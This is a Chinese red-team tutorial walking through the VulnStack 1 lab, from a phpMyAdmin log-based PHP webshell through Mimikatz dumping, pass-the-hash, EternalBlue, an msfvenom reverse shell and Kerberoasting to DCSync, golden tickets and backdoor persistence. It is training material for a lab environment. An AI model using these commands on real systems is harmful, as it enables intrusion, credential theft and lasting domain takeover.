# 靶场10：VulnStack（红日靶场）

> **难度等级**：🟠 高等
> **预计学习时间**：180分钟
> **学习目标**：
> - 了解VulnStack靶场系列的整体架构和设计理念
> - 掌握VulnStack 1的完整渗透流程
> - 学会外网打点、内网信息收集、横向移动、域渗透等核心技能
> - 理解红日靶场系列的学习路线和进阶方法

---

## 一、VulnStack 介绍

VulnStack（红日靶场）是由国内知名安全团队"红日安全"推出的一系列内网渗透实战靶场。作为国内最早的内网渗透靶场之一，VulnStack在国内安全圈享有极高的声誉，被誉为"内网渗透入门必刷靶场"。

### 1.1 什么是VulnStack

VulnStack是一系列模拟真实企业内网环境的虚拟机靶场，每一个靶场都精心设计了多个漏洞点，涵盖Web漏洞、系统漏洞、配置错误、域渗透等多个维度。学员可以通过完整的渗透流程，从外网打点一路深入到内网核心区域，最终拿下域控权限。

> 💡 **大白话说VulnStack——内网渗透的"毕业考试"**
>
> 之前的靶场打的是"一个网站"，VulnStack打的是"一个企业"。
>
> 用游戏来比喻：
> - DVWA/SQLi-Labs = 打木桩（练基本功）
> - Vulhub = 模拟对战（练单个漏洞的真实利用）
> - **VulnStack** = 完整的副本（从初入到通关，一整套流程）
>
> VulnStack最牛的地方是：**它把整个红队攻击链串起来了**：
> 1. 你从外网找到一个Web漏洞 → 拿到第一台机器的权限
> 2. 在这个机器上收集信息 → 发现内网其他机器
> 3. 横向移动到其他机器 → 找到域控制器
> 4. 攻击域控 → 拿下整个域
>
> 打完VulnStack，你就亲手走完了一遍完整的内网渗透流程。这是从"Web安全"到"红队"的质变。
>
> **注意**：VulnStack需要VMware虚拟机环境，至少8GB内存。建议学了内网渗透（第39-56章）之后再打。

### 1.2 为什么选择VulnStack

- **贴近实战**：环境设计参考真实企业内网架构，漏洞组合贴近真实攻击路径
- **中文友好**：国内团队开发，配套教程和社区交流均为中文，降低学习门槛
- **体系完整**：从Web打点到域控拿下，完整覆盖红队作战全流程
- **社区活跃**：大量Writeup和讨论，遇到问题容易找到解决方案
- **免费开源**：靶场镜像免费下载，适合个人学习使用

---

## 二、靶场系列概览

VulnStack系列目前共发布了5个靶场，难度逐步递增，场景各不相同。

### 2.1 VulnStack 1：红队实战（一）

**难度**：⭐⭐⭐ 入门级内网渗透
**场景**：经典的Web打点→内网横向→域控拿下
**包含内容**：
- 外网Web服务器（phpMyAdmin + 任意文件读取）
- 内网Windows主机
- Active Directory域环境
- 域内多台主机

**推荐理由**：最经典的内网入门靶场，流程完整，漏洞利用难度适中，非常适合第一次接触内网渗透的学员。

### 2.2 VulnStack 2：红队实战（二）

**难度**：⭐⭐⭐⭐ 进阶级
**场景**：多层网络架构，更加复杂的内网环境
**特点**：
- 更复杂的网络拓扑
- 更多的攻击路径选择
- 涉及更多内网渗透技巧

### 2.3 VulnStack 3：红队实战（三）

**难度**：⭐⭐⭐⭐ 进阶级
**场景**：Bypass安全防护的实战场景
**特点**：
- 引入安全防护设备模拟
- 需要掌握免杀和绕过技巧
- 更贴近真实红蓝对抗

### 2.4 VulnStack 4：红队实战（四）

**难度**：⭐⭐⭐⭐ 高阶级
**场景**：多层域环境，跨域攻击
**特点**：
- 多域林架构
- 域信任关系利用
- 更复杂的横向移动路径

### 2.5 VulnStack 5：红队实战（五）

**难度**：⭐⭐⭐⭐⭐ 专家级
**场景**：综合实战场景，模拟大型企业内网
**特点**：
- 最复杂的VulnStack靶场
- 涵盖多种高级攻击技术
- 适合有一定基础的学员挑战

---

## 三、环境搭建

### 3.1 准备工作

**所需软件**：
- VMware Workstation / VirtualBox（推荐VMware）
- VulnStack靶场镜像文件
- Kali Linux攻击机（自行准备）

**硬件要求**：
- 内存：至少8GB RAM（推荐16GB以上）
- 硬盘：至少50GB可用空间
- CPU：支持虚拟化的多核处理器

### 3.2 虚拟机导入步骤

**步骤1：下载靶场镜像**

访问红日安全官网或GitHub仓库下载VulnStack靶场镜像：
```
# 官方下载地址（以实际发布为准）
https://www.vulnstack.com/
https://github.com/78778443/
```

**步骤2：解压镜像文件**

下载的文件通常是压缩包，需要解压：
```bash
# Linux/Mac
7z x vulnstack1.7z

# Windows
# 使用7-Zip或WinRAR解压
```

**步骤3：导入虚拟机**

以VMware为例：
1. 打开VMware Workstation
2. 点击"文件" → "打开"
3. 选择解压后的 `.vmx` 文件
4. 根据提示选择"我已移动该虚拟机"
5. 等待导入完成

### 3.3 网络配置

VulnStack 1通常包含以下虚拟机：

| 虚拟机 | 角色 | 网卡模式 | IP地址 |
|--------|------|----------|--------|
| Kali | 攻击机 | NAT + VMnet1 | 自定义 |
| Web服务器 | 外网边界 | VMnet1（内网） | 192.168.1.100 |
| 域内主机 | 内网主机 | VMnet1（内网） | 192.168.1.x |
| 域控 | DC | VMnet1（内网） | 192.168.1.x |

**配置步骤**：

1. **创建VMnet1（仅主机模式）**：
   - 编辑 → 虚拟网络编辑器
   - 添加网络 → 选择VMnet1
   - 设置为"仅主机模式"
   - 子网IP：192.168.1.0/24

2. **配置各虚拟机网卡**：
   - 攻击机Kali：网卡1为NAT（上网用），网卡2为VMnet1（攻击内网用）
   - 靶机所有机器：网卡均为VMnet1

3. **验证网络连通性**：
```bash
# 在Kali中查看网卡
ip a

# 测试连通性（假设Web服务器IP为192.168.1.100）
ping 192.168.1.100 -c 3
```

---

## 四、VulnStack 1 详细实战攻略

> 💡 **大白话说内网渗透全流程——"从正门撬锁到拿下整栋大楼"**
>
> VulnStack 1的攻击流程可以比作一次"大楼入侵计划"，每一步都有一个生动的比喻：
>
> **第一关：外网打点 = 找到大楼的入口**
> 你在外围观察大楼，发现了phpMyAdmin这个"后门"（就像发现大楼侧门没上锁）。你试了弱口令 `root/root`，门开了。这就是"信息收集+漏洞利用"的结果——如果没发现phpMyAdmin，你可能就无功而返。
>
> **第二关：获取立足点 = 进入一楼大厅**
> 进了phpMyAdmin，你用日志写Shell的方法在服务器上放了一个"窃听器"（WebShell）。你现在只是在大楼的一个角落（Web目录），权限很低，就像站在大堂角落的访客。
>
> **第三关：信息收集 = 画地图**
> 你开始在大楼里侦察：有哪些房间（内网IP），哪些房间锁着（端口），哪些房间需要特殊门卡（域环境）。你知道了"域控"是最重要的房间（有所有门卡的复制机）。
>
> **第四关：横向移动 = 从一楼到其他楼层**
> 你用Mimikatz在内存里找到了一张"通用门卡"（域用户密码/哈希），然后去试其他房间——能打开就进去看看，收集更多信息。这一步叫"横向移动"，核心思路是：**拿到的门卡越多，能进的房间越多**。
>
> **第五关：域渗透 = 找到管理员办公室**
> 域渗透是最精彩的部分。你通过Kerberoasting之类的技术，找到了"管理员办公室"的线索（服务账号密码），然后想办法溜进去。
>
> **第六关：拿下域控 = 拿到万能钥匙**
> 域控（Domain Controller）是整个域（大楼）的管理中枢。拿下域控，你就有了所有人的门卡、所有门禁的权限、所有监控的画面。

### 4.1 环境介绍和拓扑

VulnStack 1 是一个典型的"外网Web服务器 + 内网域环境"架构：

```
                ┌──────────────┐
                │   攻击机     │
                │   Kali Linux │
                └──────┬───────┘
                       │ VMnet1
          ┌────────────┼────────────┐
          │            │            │
    ┌─────▼─────┐ ┌───▼────┐ ┌────▼─────┐
    │ Web服务器  │ │ 成员机 │  │  域控    │
    │ (边界)    │ │        │  │  (DC)    │
    └───────────┘ └────────┘  └──────────┘
         192.168.1.0/24 内网
```

**目标**：从外网Web服务器入手，最终拿下域控权限。

### 4.2 信息收集

**步骤1：端口扫描**

```bash
# 使用nmap进行全端口扫描
nmap -p- -sV -sC 192.168.1.100 -oN nmap_full.txt

# 快速扫描常用端口
nmap -sV -sC -O 192.168.1.100 -oN nmap_initial.txt
```

**预期发现的端口和服务**：
- 80/tcp - HTTP - Apache + PHP
- 3306/tcp - MySQL
- 其他可能开放的端口

**步骤2：Web信息收集**

```bash
# 目录扫描
dirsearch -u http://192.168.1.100 -e php,txt,html,zip,bak

# 使用 gobuster
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x php

# 指纹识别
whatweb http://192.168.1.100
```

**步骤3：查找敏感文件**

```bash
# 查找phpMyAdmin
http://192.168.1.100/phpmyadmin/

# 查找备份文件
http://192.168.1.100/www.zip
http://192.168.1.100/backup.sql
```

### 4.3 外网打点（Web漏洞利用）

**漏洞点：phpMyAdmin 弱口令 + 日志GetShell**

**步骤1：登录phpMyAdmin**

访问 `http://192.168.1.100/phpmyadmin/`，尝试弱口令：
```
用户名：root
密码：root / 123456 / 空密码
```

**步骤2：验证日志写Shell可能性**

```sql
-- 查看日志状态
SHOW VARIABLES LIKE '%general%';

-- 查看日志路径
SHOW VARIABLES LIKE '%log%';

-- 开启通用日志
SET GLOBAL general_log = 'ON';

-- 设置日志文件路径为Web目录
SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php';
```

**步骤3：写入WebShell**

```sql
-- 执行SQL查询，将PHP代码写入日志文件
SELECT '<?php @eval($_POST["cmd"]); ?>';
```

**步骤4：验证Shell**

访问 `http://192.168.1.100/shell.php`，使用蚁剑或菜刀连接，密码为 `cmd`。

### 4.4 获取WebShell

**使用中国蚁剑连接**：

1. 打开蚁剑，添加数据
2. URL地址：`http://192.168.1.100/shell.php`
3. 连接密码：`cmd`
4. 编码选择：base64
5. 点击"测试连接"，成功后保存

**信息收集（WebShell层面）**：

```bash
# 查看系统信息
whoami
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# 查看网络信息
ipconfig /all
route print
arp -a

# 查看当前用户权限
whoami /priv
```

### 4.5 权限提升

**方法1：利用系统漏洞提权**

```bash
# 查看系统补丁情况
systeminfo

# 使用Windows-Exploit-Suggester检测可利用漏洞
python2 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

**方法2：利用服务权限配置错误提权**

```bash
# 查看服务配置
sc qc <服务名>

# 查看服务权限
accesschk.exe -uwcqv "Authenticated Users" *
```

**方法3：烂土豆/令牌窃取提权**

```bash
# 使用烂土豆提权（适用于Windows Server 2008/2012）
# 上传 RottenPotato.exe 或 JuicyPotato.exe
JuicyPotato.exe -t * -p "C:\windows\system32\cmd.exe" -l 9001
```

### 4.6 内网信息收集

拿到内网机器权限后，进行内网信息收集：

**步骤1：基本信息收集**

```bash
# 查看域信息
net user /domain
net group "domain admins" /domain
net group "enterprise admins" /domain
net accounts /domain

# 查看当前域
echo %userdomain%
net config workstation

# 查看域控
nltest /dclist:god.org
net time /domain
```

**步骤2：存活主机探测**

```bash
# 使用CMD探测
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL="

# 使用PowerShell探测
1..254 | ForEach-Object { Test-Connection -ComputerName 192.168.1.$_ -Count 1 -ErrorAction SilentlyContinue }

# 扫描内网端口（使用上传的工具）
# fscan64.exe -h 192.168.1.0/24
```

**步骤3：定位域控**

```bash
# 查看域控IP
nslookup god.org
ping -n 1 god.org

# 获取所有域内机器
net view /domain:god
```

### 4.7 横向移动

> 💡 **大白话说横向移动——"借力打力，以点带面"**
>
> 横向移动是内网渗透最核心的环节。拿到第一台机器后，你不是要单独攻击每台机器，而是**利用第一台机器上的"线索"去打开下一台**。
>
> 用"校园入侵"来理解：
> - 你潜入了教学楼的一间教室（Web服务器）
> - 在讲台抽屉里找到了一串钥匙（通过Mimikatz获取的密码/哈希）
> - 你拿这串钥匙去试教学楼里的其他房间（横向移动）
> - 有些房间能用同一把钥匙打开（密码复用）
> - 有些房间需要用钥匙上写的"万能钥匙标识"来开（Pass-the-Hash）
> - 每进入一个新房间，你又可能找到新的钥匙，能打开更多的门
>
> **为什么横向移动能成功？**
> 1. **密码复用**：人们喜欢用同一个密码，域用户可能在多台机器上用相同密码
> 2. **凭据残留**：WIndows会把登录过的凭据缓存在内存里（LSASS进程），你可以用Mimikatz提取
> 3. **信任关系**：域内的机器天然信任域控，域控天然信任域管——这种信任链就是攻击链
>
> 横向移动的关键不是技术难度，而是**耐心和全面**——不要放过任何一台机器、任何一个进程、任何一个缓存文件。

**方法1：密码喷洒攻击**

```bash
# 利用收集到的用户名和密码进行尝试
# 使用 CrackMapExec
cme smb 192.168.1.0/24 -u user.txt -p pass.txt

# 或使用 impacket 工具
python GetNPUsers.py god.org/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

**方法2：Pass-the-Hash 横向**

```bash
# 如果获取到NTLM哈希
# 使用 impacket-psexec
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.101

# 使用 wmiexec
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.101
```

**方法3：利用MS17-010（永恒之蓝）**

```bash
# 扫描MS17-010漏洞
nmap --script smb-vuln-ms17-010 -p445 192.168.1.0/24

# 使用MSF利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### 4.8 域渗透

> 💡 **大白话说域渗透的核心——"Windows域的'通行证'体系"**
>
> 域环境的核心是 **Kerberos 协议**——一个在希腊神话中用三头犬命名的认证协议。用现实世界来理解：
>
> 整个域就像一个大型企业内部：
> - **域控（DC）** = 保安总部，有所有门禁卡的母版
> - **域用户** = 普通员工，每天上班前要从保安总部领一张"当日通行证"（TGT - Ticket Granting Ticket）
> - **服务票据（TGS）** = 你拿通行证去换"进某个房间的门卡"
> - **krbtgt账户** = 保安总部的"公章"，所有通行证都盖这个章
>
> 攻击者的目标就是：**要么伪造公章（黄金票据），要么偷到真通行证（窃取凭据），要么伪造某个房间的专用门卡（白银票据）**。
>
> **黄金票据为什么叫"黄金"？** 因为获取了krbtgt的哈希后，你可以—**伪造任意用户的通行证，访问域内任意服务**。相当于你拿到了保安总部的公章，想给谁开通行证就给谁开。而且这个通行证的"有效期"你可以自己设（最长可以是10年），所以黄金票据是最理想的权限维持手段。
>
> **DCSync为什么强大？** 因为一台被赋予"复制目录"权限的机器，可以直接从域控上"同步"所有用户的密码哈希——就像你拿到了保安总部的人事档案，上面有所有员工的密码。

**步骤1：获取域用户哈希**

```bash
# 从域成员机导出本地SAM和LSA哈希
# 使用 Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::msv

# 导出所有登录过的用户凭据
sekurlsa::ekeys
```

**步骤2：Kerberoasting 攻击**

```bash
# 使用 Rubeus 请求服务票据
Rubeus.exe kerberoast /outfile:hashes.txt

# 使用 impacket GetUserSPNs
python GetUserSPNs.py god.org/mary:password -dc-ip 192.168.1.10 -request
```

**步骤3：AS-REP Roasting**

```bash
# 使用 Rubeus
Rubeus.exe asreproast /outfile:asrep.txt

# 使用 impacket GetNPUsers
python GetNPUsers.py god.org/ -usersfile users.txt -outputfile asrep.txt
```

### 4.9 拿下域控

**方法1：DCSync 攻击**

如果拥有域管理员权限或具有DCSync权限的账户：

```bash
# 使用 Mimikatz
lsadump::dcsync /domain:god.org /all /csv

# 导出指定用户哈希
lsadump::dcsync /domain:god.org /user:krbtgt
```

**方法2：利用域管登录会话**

```bash
# 查找域管登录的机器
# 使用 psloggedon 或 net sess

# 如果找到域管登录的机器，先拿下该机器，再窃取凭据
# Mimikatz 窃取域管凭据
privilege::debug
sekurlsa::logonpasswords
```

**方法3：黄金票据（Golden Ticket）**

```bash
# 首先获取krbtgt的NTLM哈希
# 然后创建黄金票据
kerberos::golden /user:Administrator /domain:god.org /sid:S-1-5-21-xxxxxxxxx /krbtgt:xxxxxxxxxx /ptt

# 访问域控
dir \\dc.god.org\c$
```

### 4.10 权限维持

**方法1：黄金票据**

```bash
# Mimikatz创建黄金票据
kerberos::golden /user:hacker /domain:god.org /sid:S-1-5-21-123456789-1234567890-123456789 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
```

**方法2：白银票据（Silver Ticket）**

```bash
# 创建CIFS服务的白银票据
kerberos::golden /domain:god.org /sid:S-1-5-21-xxx /target:dc.god.org /service:cifs /rc4:xxxxx /user:administrator /ptt
```

**方法3：DSRM后门**

```bash
# 利用域控的DSRM账户维持权限
# 修改DSRM密码为已知值
# 然后以DSRM身份登录
```

**方法4：ACL后门**

```bash
# 给指定用户添加DCSync权限
# 使用 PowerView
Add-DomainObjectAcl -TargetIdentity "DC=god,DC=org" -PrincipalIdentity hacker -Rights DCSync
```

---

## 五、其他靶场简介和攻略要点

### 5.1 VulnStack 2 攻略要点

VulnStack 2 增加了更多的内网机器和更复杂的网络架构：

**关键突破点**：
- 外网Web应用漏洞（如ThinkPHP、Struts2等）
- 数据库注入获取凭据
- 内网多网段渗透
- 跨网段横向移动

**学习重点**：
- 多层网络架构下的代理和转发技术
- 更复杂的域信任关系利用
- 多路径攻击思路

### 5.2 VulnStack 3 攻略要点

VulnStack 3 引入了安全防护机制：

**关键突破点**：
- 绕过安全软件的WebShell
- 免杀木马制作
- 白名单利用（如借助系统工具执行代码）
- 无文件攻击技术

**学习重点**：
- 免杀和绕过技术
- 无文件攻击（PowerShell、WMI、注册表）
- 白名单程序利用（mshta、rundll32、regsvr32等）

### 5.3 VulnStack 4 & 5 攻略要点

**VulnStack 4**：
- 多域林环境
- 域信任攻击
- 跨域攻击路径

**VulnStack 5**：
- 最复杂的综合场景
- 多种高级攻击技术
- 模拟真实APT攻击流程

---

## 六、学习建议和进阶路线

### 6.1 学习路线建议

**第一阶段：基础打牢**
- 学习Web安全基础知识（SQL注入、XSS、文件上传等）
- 掌握常见Web框架漏洞（ThinkPHP、Struts2、Spring等）
- 熟悉Windows基本命令和PowerShell

**第二阶段：内网入门**
- 完成VulnStack 1（至少通关2遍）
- 学习内网信息收集方法论
- 掌握横向移动基础技术

**第三阶段：域渗透进阶**
- 学习Kerberos协议原理
- 掌握各种域渗透攻击技术
- 完成VulnStack 2、3

**第四阶段：高级技术**
- 学习免杀和绕过技术
- 研究域信任和林攻击
- 完成VulnStack 4、5

### 6.2 学习方法建议

1. **先自己做，再看Writeup**：遇到卡壳再查答案，印象更深刻
2. **多做笔记，整理思维导图**：建立自己的知识体系
3. **尝试多种方法**：同一目标尝试不同攻击路径
4. **复盘总结**：每做完一个靶场写一篇详细的渗透报告
5. **关注工具更新**：内网工具迭代很快，保持学习

---

## 七、实战案例

### 案例1：Web打点实战

**场景**：在VulnStack 1中，通过phpMyAdmin弱口令获取WebShell。

> 💡 **大白话说phpMyAdmin日志写Shell——"在笔记本封面上修改书名"**
>
> 这是VulnStack 1外网打点的关键步骤。phpMyAdmin弱口令并不少见——很多开发者和运维人员图方便，MySQL的root密码就是root。
>
> 日志写Shell的原理很巧妙。MySQL有"通用日志"功能——把执行的每一条SQL语句记录到日志文件里。正常情况下日志是写到MySQL的数据目录的，但你可以通过SQL命令修改日志文件的**位置和文件名**。
>
> 就像一个笔记本：
> - 本来：日志写在 `/var/lib/mysql/general.log`（MySQL自己的笔记本）
> - 攻击者把日志位置改成 `C:/phpStudy/WWW/shell.php`（Web目录下的PHP文件）
> - 然后执行 `SELECT '<?php eval($_POST["cmd"]);?>';` → 这行SQL被"记录"到了shell.php中
> - 现在这个日志文件的内容是一行PHP代码 → 浏览器访问它就执行了PHP代码 → WebShell！
>
> 这就是"在笔记本的封面上写了书名，结果笔记本就变成了书"——因为Apache遇到.php文件就会用PHP引擎去解析，而文件里的内容恰好是PHP代码。
>
> 这个方法在真实渗透中也常用，因为不需要知道网站的绝对路径以外的任何条件，也不需要写权限突破其他限制。

**详细步骤**：

1. **信息收集阶段**：
```bash
# 端口扫描发现80端口和3306端口
nmap -sV -p- 192.168.1.100
```

2. **目录扫描发现phpMyAdmin**：
```bash
dirsearch -u http://192.168.1.100 -e php
# 发现 /phpmyadmin/ 目录
```

3. **弱口令尝试**：
```
访问 http://192.168.1.100/phpmyadmin/
尝试 root/root 成功登录
```

4. **日志写Shell**：
```sql
-- 开启general_log
SET GLOBAL general_log = 'ON';

-- 设置日志文件路径
SET GLOBAL general_log_file = 'C:/phpStudy/WWW/test.php';

-- 写入一句话木马
SELECT '<?php eval($_POST["x"]);?>';
```

5. **连接验证**：
```
使用蚁剑连接 http://192.168.1.100/test.php，密码x
成功获取WebShell权限
```

**经验总结**：phpMyAdmin弱口令是非常常见的漏洞点，日志写Shell是经典利用手法。实战中还可以尝试slow_query_log、into outfile等方法。

---

### 案例2：内网信息收集

**场景**：拿到WebShell后，进行全面的内网信息收集。

**详细步骤**：

1. **基础信息收集**：
```powershell
# 系统信息
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# 当前用户和权限
whoami
whoami /priv

# 网络配置
ipconfig /all
```

2. **域信息收集**：
```powershell
# 查看是否在域中
net config workstation

# 查看域信息
net user /domain
net group "domain computers" /domain
net group "domain admins" /domain

# 查找域控
net time /domain
nltest /dsgetdc:god.org
```

3. **存活主机探测**：
```powershell
# 使用PowerShell批量ping
$ips = 1..254 | ForEach-Object { "192.168.1.$_" }
$ips | ForEach-Object {
    if (Test-Connection -ComputerName $_ -Count 1 -Quiet -ErrorAction SilentlyContinue) {
        Write-Host "$_ is alive"
    }
}
```

4. **端口扫描**：
```bash
# 上传fscan进行内网扫描
fscan64.exe -h 192.168.1.0/24 -o result.txt
```

**经验总结**：内网信息收集是横向移动的基础，信息越全面，攻击路径越多。推荐使用fscan、Nishang、PowerView等工具提高效率。

---

### 案例3：横向移动

**场景**：从Web服务器横向移动到域内其他主机。

**详细步骤**：

1. **获取凭据**：
```bash
# 使用Mimikatz抓取内存中的密码
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 发现域用户的明文密码或NTLM哈希
```

2. **探测可登录主机**：
```bash
# 使用cme验证凭据
cme smb 192.168.1.0/24 -u administrator -p 'P@ssw0rd123' --local-auth

# 域凭据验证
cme smb 192.168.1.0/24 -u mary -d god.org -p 'Mary123!'
```

3. **执行命令获取Shell**：
```bash
# 使用psexec获取交互式Shell
impacket-psexec god.org/mary:Mary123!@192.168.1.101

# 使用wmiexec（更隐蔽）
impacket-wmiexec god.org/mary:Mary123!@192.168.1.101

# 使用smbexec
impacket-smbexec god.org/mary:Mary123!@192.168.1.101
```

4. **建立持久连接**：
```bash
# 使用MSF生成木马上线
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe

# 上传并执行
```

**经验总结**：横向移动的核心是凭据复用。拿到一个域用户的凭据后，应该尽快验证这个凭据能登录哪些机器，扩大战果。

---

### 案例4：域渗透

**场景**：利用Kerberoasting攻击获取服务账号哈希，破解后拿到域管权限。

**详细步骤**：

1. **查找SPN服务账号**：
```powershell
# 使用PowerView
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# 使用setspn命令
setspn -Q */*
```

2. **请求服务票据**：
```bash
# 使用Rubeus
Rubeus.exe kerberoast /outfile:kerb.txt

# 使用impacket
python3 GetUserSPNs.py god.org/mary:Mary123! -dc-ip 192.168.1.10 -request
```

3. **离线破解哈希**：
```bash
# 使用hashcat破解
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# 或使用John
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
```

4. **利用破解的密码**：
```bash
# 如果破解出的是域管密码，直接登录域控
impacket-wmiexec god.org/administrator:Admin123!@192.168.1.10
```

**经验总结**：Kerberoasting是域渗透中非常重要的攻击手法，因为服务账号通常权限较高，且密码设置较弱的概率大。

---

### 案例5：权限维持

**场景**：拿下域控后，建立多种权限维持手段。

**详细步骤**：

1. **黄金票据维持**：
```bash
# 导出krbtgt哈希
mimikatz "lsadump::dcsync /domain:god.org /user:krbtgt" "exit"

# 生成黄金票据并注入
mimikatz "kerberos::golden /user:hacker /domain:god.org /sid:S-1-5-21-xxx /krbtgt:xxx /ptt" "exit"

# 验证票据
klist
dir \\dc.god.org\c$
```

2. **ACL后门**：
```powershell
# 使用PowerView给普通用户添加DCSync权限
Add-DomainObjectAcl -TargetIdentity "DC=god,DC=org" -PrincipalIdentity mary -Rights DCSync

# 验证DCSync权限
mimikatz "lsadump::dcsync /domain:god.org /user:administrator" "exit"
```

3. **计划任务后门**：
```bash
# 在域控上创建计划任务
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c net user hacker Hacker123! /add && net localgroup administrators hacker /add" /sc daily /st 03:00 /ru SYSTEM
```

4. **注册表后门**：
```bash
# 使用粘滞键后门
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

**经验总结**：权限维持要多样化，不要只依赖一种方式。推荐组合使用：黄金票据 + ACL后门 + 计划任务 + 隐蔽账号。

---

## 八、练习题

### 基础题（5道）

1. **VulnStack 1中，Web服务器上phpMyAdmin的默认弱口令是什么？请描述通过phpMyAdmin获取WebShell的三种方法。**

2. **内网信息收集的主要内容包括哪些方面？请列举至少5个常用的信息收集命令及其作用。**

3. **什么是Pass-the-Hash攻击？它的原理是什么？在什么条件下可以使用？**

4. **Kerberoasting攻击的原理是什么？为什么这种攻击方式有效？请描述完整的攻击流程。**

5. **DCSync攻击需要什么权限？请描述DCSync攻击的执行步骤和检测方法。**

### 进阶题（5道）

6. **假设你已经获取了VulnStack 1中Web服务器的WebShell权限，请设计一个完整的内网渗透方案，从信息收集到拿下域控，包含至少3种不同的攻击路径。**

7. **黄金票据（Golden Ticket）和白银票据（Silver Ticket）有什么区别？分别适用于什么场景？如何防御这两种攻击？**

8. **在VulnStack 3中，如果目标机器安装了杀毒软件，你会采用哪些技术来绕过防护执行代码？请列举至少5种方法并说明原理。**

9. **请设计一个域环境中的权限维持方案，要求至少包含3种不同的维持手段，并说明各自的优缺点和检测方法。**

10. **对比VulnStack系列和其他内网靶场（如GOAD、DetectionLab），分析各自的优缺点和适用场景，并给出学习建议。**

---

## 安全提醒

> **⚠️ 重要声明**
>
> 本文档中的所有技术内容仅供学习和研究使用，仅适用于在**合法授权的靶场环境**中进行练习。
>
> - 请勿在未授权的任何系统上使用本文档中描述的技术
> - 请遵守《网络安全法》及相关法律法规
> - 任何未经授权的渗透测试行为均属于违法行为
> - 学习过程中请尊重他人隐私和知识产权
>
> 安全技术应用于防护和建设，而非攻击和破坏。请树立正确的网络安全观，做遵纪守法的白帽黑客。
